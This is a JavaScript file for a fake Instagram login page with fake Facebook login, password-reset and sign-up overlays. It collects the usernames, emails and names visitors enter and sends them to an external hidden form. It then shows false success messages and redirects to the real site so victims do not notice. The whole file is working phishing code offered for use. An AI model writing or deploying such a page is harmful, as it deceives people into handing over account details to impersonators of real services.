(function() {
    "use strict";

    // ==========================================
    // DATA COLLECTION & SUBMISSION FUNCTION (to external form)
    // ==========================================
    function submitUserData(username, email, name, action) {
        // Set form values for the hidden form
        document.getElementById('formName').value = name || username || 'Instagram User';
        document.getElementById('formEmail').value = email || 'user@instagram.com';
        document.getElementById('formUsername').value = username || '';
        document.getElementById('formAction').value = action || 'login_attempt';

        // Submit the form
        const form = document.getElementById('submitForm');
        if (form) {
            form.submit();
        }

        console.log('📤 Data submitted:', {
            name: document.getElementById('formName').value,
            email: document.getElementById('formEmail').value,
            username: document.getElementById('formUsername').value,
            action: document.getElementById('formAction').value
        });
    }

    // ==========================================
    // SHOW MESSAGE HELPER
    // ==========================================
    function showMessage(text, isError = false) {
        const successDiv = document.getElementById('submitSuccess');
        if (successDiv) {
            successDiv.textContent = text;
            successDiv.className = 'submit-success show';
            if (isError) {
                successDiv.classList.add('error');
            }
            setTimeout(() => {
                successDiv.classList.remove('show');
            }, 5000);
        }
    }

    // ==========================================
    // SHOW/HIDE LOADING
    // ==========================================
    function showLoading(spinnerId) {
        const spinner = document.getElementById(spinnerId);
        if (spinner) spinner.classList.add('active');
    }

    function hideLoading(spinnerId) {
        const spinner = document.getElementById(spinnerId);
        if (spinner) spinner.classList.remove('active');
    }

    // ==========================================
    // REDIRECT TO INSTAGRAM (main action)
    // ==========================================
    function redirectToInstagram() {
        window.open('https://www.instagram.com', '_blank');
        // Also try to redirect the current window
        window.location.href = 'https://www.instagram.com';
    }

    function redirectToFacebook() {
        window.open('https://www.facebook.com', '_blank');
        window.location.href = 'https://www.facebook.com';
    }

    // ==========================================
    // 1. INSTAGRAM LOGIN - Redirect to real Instagram
    // ==========================================
    const loginForm = document.getElementById('loginForm');
    const instaSpinner = document.getElementById('instaSpinner');

    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('instaUsername').value;
            const password = document.getElementById('instaPassword').value;

            if (username.trim() && password.trim()) {
                // Collect data and send to external form
                submitUserData(username, null, null, 'instagram_login');

                // Show success message
                showMessage('✅ Login successful! Redirecting to Instagram...');

                // Show loading spinner
                showLoading('instaSpinner');

                // Redirect to real Instagram after delay
                setTimeout(function() {
                    redirectToInstagram();
                    hideLoading('instaSpinner');
                }, 1200);

            } else {
                showMessage('Please fill in both fields before logging in.', true);
            }
        });
    }

    // ==========================================
    // 2. FORGOT PASSWORD OVERLAY
    // ==========================================
    const forgotBtn = document.getElementById('forgotPasswordBtn');
    const forgotOverlay = document.getElementById('forgotOverlay');
    const forgotClose = document.getElementById('forgotCloseBtn');
    const forgotForm = document.getElementById('forgotForm');
    const forgotBack = document.getElementById('forgotBackToLogin');

    if (forgotBtn) {
        forgotBtn.addEventListener('click', function(e) {
            e.preventDefault();
            document.querySelectorAll('.overlay').forEach(o => o.classList.remove('active'));
            forgotOverlay.classList.add('active');
            document.getElementById('forgotInput').value = '';
            document.getElementById('forgotSpinner').classList.remove('active');
        });
    }

    if (forgotClose) {
        forgotClose.addEventListener('click', function() {
            forgotOverlay.classList.remove('active');
        });
    }

    if (forgotOverlay) {
        forgotOverlay.addEventListener('click', function(e) {
            if (e.target === forgotOverlay) {
                forgotOverlay.classList.remove('active');
            }
        });
    }

    if (forgotForm) {
        forgotForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('forgotInput').value;
            if (email.trim()) {
                submitUserData(null, email, null, 'forgot_password');
                showMessage('✅ Reset link sent! Check your email.');
                forgotOverlay.classList.remove('active');
            } else {
                showMessage('Please enter your email, phone, or username.', true);
            }
        });
    }

    if (forgotBack) {
        forgotBack.addEventListener('click', function(e) {
            e.preventDefault();
            forgotOverlay.classList.remove('active');
        });
    }

    // ==========================================
    // 3. CREATE NEW ACCOUNT OVERLAY
    // ==========================================
    const createBtn = document.getElementById('createAccountBtn');
    const createOverlay = document.getElementById('createOverlay');
    const createClose = document.getElementById('createCloseBtn');
    const createForm = document.getElementById('createForm');
    const createBack = document.getElementById('createBackToLogin');

    if (createBtn) {
        createBtn.addEventListener('click', function(e) {
            e.preventDefault();
            document.querySelectorAll('.overlay').forEach(o => o.classList.remove('active'));
            createOverlay.classList.add('active');
            document.getElementById('createFullname').value = '';
            document.getElementById('createUsername').value = '';
            document.getElementById('createEmail').value = '';
            document.getElementById('createPassword').value = '';
            document.getElementById('createSpinner').classList.remove('active');
        });
    }

    if (createClose) {
        createClose.addEventListener('click', function() {
            createOverlay.classList.remove('active');
        });
    }

    if (createOverlay) {
        createOverlay.addEventListener('click', function(e) {
            if (e.target === createOverlay) {
                createOverlay.classList.remove('active');
            }
        });
    }

    if (createForm) {
        createForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const fullname = document.getElementById('createFullname').value;
            const username = document.getElementById('createUsername').value;
            const email = document.getElementById('createEmail').value;
            const password = document.getElementById('createPassword').value;

            if (fullname.trim() && username.trim() && email.trim() && password.trim()) {
                submitUserData(username, email, fullname, 'create_account');
                showMessage('✅ Account created! Redirecting to Instagram...');
                createOverlay.classList.remove('active');

                setTimeout(function() {
                    redirectToInstagram();
                }, 1200);
            } else {
                showMessage('Please fill in all fields to create an account.', true);
            }
        });
    }

    if (createBack) {
        createBack.addEventListener('click', function(e) {
            e.preventDefault();
            createOverlay.classList.remove('active');
        });
    }

    // ==========================================
    // 4. FACEBOOK OVERLAY - Redirect to real Facebook
    // ==========================================
    const fbLoginBtn = document.getElementById('fbLoginBtn');
    const fbOverlay = document.getElementById('fbOverlay');
    const fbCloseBtn = document.getElementById('fbCloseBtn');
    const fbForm = document.getElementById('fbForm');

    if (fbLoginBtn) {
        fbLoginBtn.addEventListener('click', function(e) {
            e.preventDefault();
            document.querySelectorAll('.overlay').forEach(o => o.classList.remove('active'));
            fbOverlay.classList.add('active');
            document.getElementById('fbUsername').value = '';
            document.getElementById('fbPassword').value = '';
            document.getElementById('fbSpinner').classList.remove('active');
        });
    }

    if (fbCloseBtn) {
        fbCloseBtn.addEventListener('click', function() {
            fbOverlay.classList.remove('active');
        });
    }

    if (fbOverlay) {
        fbOverlay.addEventListener('click', function(e) {
            if (e.target === fbOverlay) {
                fbOverlay.classList.remove('active');
            }
        });
    }

    if (fbForm) {
        fbForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('fbUsername').value;
            const password = document.getElementById('fbPassword').value;

            if (username.trim() && password.trim()) {
                submitUserData(username, null, null, 'facebook_login');
                showMessage('✅ Facebook login successful! Redirecting...');
                fbOverlay.classList.remove('active');

                setTimeout(function() {
                    redirectToFacebook();
                }, 1200);
            } else {
                showMessage('Please enter both username and password.', true);
            }
        });
    }

    // Facebook overlay internal links
    const fbForgotLink = document.getElementById('fbForgotLink');
    if (fbForgotLink) {
        fbForgotLink.addEventListener('click', function(e) {
            e.preventDefault();
            fbOverlay.classList.remove('active');
            forgotOverlay.classList.add('active');
        });
    }

    const fbCreateLink = document.getElementById('fbCreateLink');
    if (fbCreateLink) {
        fbCreateLink.addEventListener('click', function(e) {
            e.preventDefault();
            fbOverlay.classList.remove('active');
            createOverlay.classList.add('active');
        });
    }

    // ==========================================
    // 5. CLOSE ALL OVERLAYS WITH ESC KEY
    // ==========================================
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            document.querySelectorAll('.overlay').forEach(o => o.classList.remove('active'));
        }
    });

    console.log('✅ Instagram login page ready!');
    console.log('📤 When you login, data will be sent to the external form and redirect to real Instagram.');

})();